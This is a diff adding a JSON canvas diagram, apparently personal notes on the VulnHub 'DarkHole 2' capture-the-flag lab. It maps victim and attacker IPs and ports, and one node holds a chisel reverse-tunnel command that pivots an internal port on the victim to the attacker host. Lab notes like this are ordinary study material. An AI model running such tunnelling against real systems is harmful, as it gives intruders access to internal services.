@@ -1,0 +1,14 @@
+{
+	"nodes":[
+		{"type":"text","text":"Victima\nDarkHole 2\n192.168.153.131\nPort :22,80\nVMware","id":"28f5ca6094438481","x":120,"y":-1600,"width":200,"height":120,"color":"1"},
+		{"type":"text","text":"Victima\nDarkHole 2\n127.0.0.1\nPort : 9999\nVMware\n\nchisel -> ./chisel client Atacante:123 -R 9999:127.0..0.1:9999","id":"4430e75921a0f5c5","x":120,"y":-1360,"width":260,"height":220,"color":"1"},
+		{"type":"file","file":"VulnHub/DarkHole2/DarkHole 2.md","id":"2b077f44e24e0df9","x":-1440,"y":-1760,"width":1120,"height":1000},
+		{"type":"text","text":"Atacante\nSwordFish\n192.168.1.130","id":"d383c360d0d71869","x":-320,"y":-1440,"width":180,"height":80}
+	],
+	"edges":[
+		{"id":"f400c372a3fcd336","fromNode":"28f5ca6094438481","fromSide":"top","toNode":"4430e75921a0f5c5","toSide":"right","color":"4"},
+		{"id":"8f6717225ead638d","fromNode":"d383c360d0d71869","fromSide":"right","toNode":"4430e75921a0f5c5","toSide":"top","color":"1","label":"\\\\\\\\\\"},
+		{"id":"9a9dfe70bf024ad2","fromNode":"4430e75921a0f5c5","fromSide":"left","toNode":"d383c360d0d71869","toSide":"bottom","color":"3","label":"====="},
+		{"id":"1a82b1ac3df78f18","fromNode":"d383c360d0d71869","fromSide":"top","toNode":"28f5ca6094438481","toSide":"top","color":"4","label":"<>"}
+	]
+}
